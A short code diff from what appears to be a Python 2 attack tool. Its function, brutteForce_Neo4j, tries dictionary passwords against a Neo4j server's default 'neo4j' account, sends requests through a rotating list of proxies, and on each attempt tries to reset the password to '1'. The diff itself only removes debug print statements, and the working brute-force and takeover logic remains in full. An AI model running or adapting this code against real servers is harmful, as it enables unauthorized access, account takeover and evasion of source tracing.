@@ -42,15 +42,10 @@ def brutteForce_Neo4j(ip,dictpassw,dictproxies,headers):
 	d = {}
 	url_changepassword = "http://"+ ip +":7474/user/neo4j/password"
 	data = '{"password":"1"}'
-	print dictpassw
-	print dictproxies
 	for i,passw in enumerate(dictpassw):
 		proxies = {
   			'http': 'http://'+dictproxies[i%(len(dictproxies)-1)],
 		}
-		print i%(len(dictproxies)-1)
-		print (dictproxies)
-		print proxies
 		try:
 			r_pass = requests.post(url_changepassword, data=data, headers=headers, auth=('neo4j', passw),timeout=2, proxies=proxies )
 			print r_pass
